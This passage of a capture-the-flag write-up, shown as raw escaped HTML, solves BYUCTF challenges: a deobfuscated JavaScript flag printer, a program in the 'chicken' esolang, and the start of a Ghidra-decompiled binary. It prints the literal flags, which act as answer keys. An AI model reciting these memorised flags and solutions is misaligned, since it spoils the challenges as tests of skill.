&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;518&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;520&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;501&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;516&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;496&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;507&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;495&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(doriel &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=== &lt;&#x2F;span&gt;&lt;span&gt;teaghan) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;makade&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;(makade&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;shift&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch &lt;&#x2F;span&gt;&lt;span&gt;(loveya) {
&lt;&#x2F;span&gt;&lt;span&gt;      makade&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;push&lt;&#x2F;span&gt;&lt;span&gt;(makade&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;shift&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}(zandrea&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;347984&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;l&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zandrea&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;k&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;o&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;494&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;hiatt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b[k]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;hiatt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;l&lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hi&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; document.domain == a(500) + a(498) + a(510) &amp;amp;&amp;amp; console[a(514)](a(515) + a(503) + a(506) + a(505) + a(517) + &amp;quot;imma_&amp;quot; + a(499) + a(513) + a(522) + a(504) + a(511) + &amp;quot;e_thi&amp;quot; + &amp;quot;s}&amp;quot;), console.log(a(521) + &amp;quot; I wo&amp;quot; + &amp;quot;nder &amp;quot; + a(523) + &amp;quot; the &amp;quot; + a(494) + a(508));
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;500&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;498&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;510&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;514&lt;&#x2F;span&gt;&lt;span&gt;)](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;515&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;503&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;506&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;505&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;517&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;imma_&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;499&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;513&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;522&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;504&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;511&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;e_thi&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;s}&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;521&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; I wo&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;nder &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;523&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; the &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;494&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;508&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hi&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I modified the code after the deobfuscation and console.logged the line which was passed to document.domain. Used &lt;code&gt;nodejs&lt;&#x2F;code&gt; to run the code.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;obfuscJStor$&lt;&#x2F;span&gt;&lt;span&gt; nodejs deobfusc.js
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{one_of_these_days_imma_make_a_tool_to_deobfuscate_this&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As simple as that :)&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{one_of_these_days_imma_make_a_tool_to_deobfuscate_this}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;chickenagain&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chickenagain&quot; aria-label=&quot;Anchor link for: chickenagain&quot;&gt;ChickenAgain&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;We heard you guys loved `chicken` so much last year, we decided to give you another one!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [chicken]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The chicken file has these lines in it.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken
&lt;&#x2F;span&gt;&lt;span&gt;chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken chicken
&lt;&#x2F;span&gt;&lt;span&gt;chicken chicken chicken chicken
&lt;&#x2F;span&gt;&lt;span&gt;.........................
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It&#x27;s a program written in an esoteric programming language called chicken. Found this github repo &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;kosayoda&#x2F;chickenpy&quot; target=_blank&gt;chickenpy&lt;&#x2F;a&gt;. Running chickenpy with the attached file decoded the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;chicken$&lt;&#x2F;span&gt;&lt;span&gt; pip install chickenpy
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;chicken$&lt;&#x2F;span&gt;&lt;span&gt; chickenpy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -f&lt;&#x2F;span&gt;&lt;span&gt; chicken
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;BYUCTF{ITS_ALL_CHICKENS?_ALWAYS_HAS_BEEN&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : BYUCTF{ITS_ALL_CHICKENS?_ALWAYS_HAS_BEEN}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;chain&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chain&quot; aria-label=&quot;Anchor link for: chain&quot;&gt;Chain&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;You know sometimes you just run out of ideas for challenge descriptions...
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [chain]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Running the binary shows that it requires flag to be inputted. ltrace didn&#x27;t worked here. So, I used &lt;code&gt;Ghidra&lt;&#x2F;code&gt; to view the source code.&lt;&#x2F;p&gt;
&lt;p&gt;The source code decompiled from ghidra.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;undefined4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FUN_000106a0&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span&gt;sVar1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; iVar2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
